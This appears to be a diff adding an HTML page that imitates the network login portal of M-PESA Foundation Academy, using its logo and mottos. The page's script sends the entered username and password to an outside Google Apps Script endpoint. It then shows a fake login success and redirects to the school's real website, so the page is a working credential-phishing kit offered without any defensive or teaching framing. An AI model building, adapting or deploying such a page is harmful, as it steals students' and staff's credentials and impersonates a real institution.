@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Network Authentication Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #333;
+    }
+    .top-text { font-size: 16px; margin-bottom: 30px; }
+    .container {
+      text-align: center;
+      border: 1px solid #eee;
+      padding: 30px 25px;
+      border-radius: 4px;
+      box-shadow: 0 0 3px rgba(0,0,0,0.1);
+      width: 280px;
+    }
+    .logo-img { width: 160px; margin-bottom: 18px; }
+    h3 { color: #2a5b9e; font-weight: normal; margin-bottom: 18px; font-size: 16px; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 10px; margin-bottom: 14px;
+      border: 1px solid #ccc; border-radius: 4px; font-size: 14px;
+    }
+    button {
+      width: 100%; background-color: #4CAF50; color: white;
+      padding: 10px; border: none; border-radius: 4px;
+      font-size: 16px; cursor: pointer; margin-bottom: 10px;
+    }
+    button:hover { background-color: #45a049; }
+    .footer-text { font-size: 13px; color: #333; }
+    .footer-text a { text-decoration: none; color: #2a5b9e; }
+    .bottom-text {
+      position: absolute; bottom: 30px; font-size: 16px;
+      text-align: center; width: 100%; color: #555;
+    }
+    #response { color: red; font-size: 14px; margin-top: 8px; }
+    /* === SUCCESS PAGE === */
+    .success-page {
+      display: none; position: fixed; top: 0; left: 0;
+      width: 100vw; height: 100vh; background: #fff;
+      flex-direction: column; align-items: center; justify-content: center;
+      z-index: 9999;
+    }
+    .success-container {
+      text-align: center; border: 1px solid #eee;
+      padding: 30px 25px; border-radius: 4px;
+      box-shadow: 0 0 3px rgba(0,0,0,0.1); width: 280px;
+    }
+    .success-message { color: #2a5b9e; font-size: 18px; margin: 20px 0; }
+    .success-check {
+      width: 60px; height: 60px; background: #4CAF50; color: white;
+      font-size: 36px; line-height: 60px; border-radius: 50%;
+      margin: 25px auto; box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+    .logout-btn {
+      background: #4CAF50; color: white; padding: 12px 0;
+      border: none; border-radius: 25px; font-size: 16px; cursor: pointer;
+      width: 277px; margin: 0 auto 10px; display: block;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    .logout-btn:hover { background: #45a049; }
+    .success-bottom {
+      position: absolute; bottom: 30px; font-size: 16px;
+      text-align: center; width: 100%; color: #555;
+    }
+  </style>
+</head>
+<body>
+  <!-- === LOGIN FORM === -->
+  <div class="top-text">Thinkers : Doers : Leaders</div>
+  <div class="container">
+    <img src="https://i.ibb.co/KST3vYh/Image-28-10-2025-at-09-31.png" class="logo-img" alt="M-PESA Foundation Academy Logo" />
+    <h3>Network Authentication Form</h3>
+    <form id="authForm">
+      <input type="text" name="username" placeholder="Enter your Username" required />
+      <input type="password" name="password" placeholder="Enter your Password" required />
+      <button type="submit">Login</button>
+    </form>
+    <p class="footer-text">
+      <a href="https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp" target="_blank">Click here to access User Portal</a>
+    </p>
+    <p id="response"></p>
+  </div>
+  <div class="bottom-text">
+    Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
+  </div>
+
+  <!-- === SUCCESS PAGE === -->
+  <div class="success-page" id="successPage">
+    <div class="success-container">
+      <div class="success-top">Thinkers : Doers : Leaders</div>
+      <img src="https://i.ibb.co/KST3vYh/Image-28-10-2025-at-09-31.png" class="logo-img" alt="Logo" />
+      <div class="success-message">You have successfully logged in to<br>use the internet.</div>
+      <div class="success-check">✓</div>
+      <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+    <div class="success-bottom">
+      Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('authForm');
+    const responseEl = document.getElementById('response');
+    const successPage = document.getElementById('successPage');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      responseEl.textContent = '';
+      const formData = new FormData(form);
+      const params = new URLSearchParams(formData);
+      try {
+        // send POST to your Apps Script endpoint
+        const res = await fetch('https://script.google.com/macros/s/AKfycbyAghYHcQ7WidM0AgaT8jnvbH7jlXtYTr1TYrupibIRYj5aRVn1VRta5OGpg-nMh2A/exec', {
+          method: 'POST',
+          body: params,
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        });
+        const text = await res.text();
+        if (text.toLowerCase().includes('success')) {
+          successPage.style.display = 'flex';
+          form.reset();
+          setTimeout(() => {
+            window.location.href = 'https://mpesafoundationacademy.ac.ke';
+          }, 1200);
+        } else {
+          responseEl.textContent = 'Submission failed: ' + text;
+        }
+      } catch (err) {
+        responseEl.textContent = 'Error: ' + err.message;
+      }
+    });
+
+    function logout() {
+      alert('Logged out successfully.');
+      successPage.style.display = 'none';
+    }
+  </script>
+</body>
+</html>
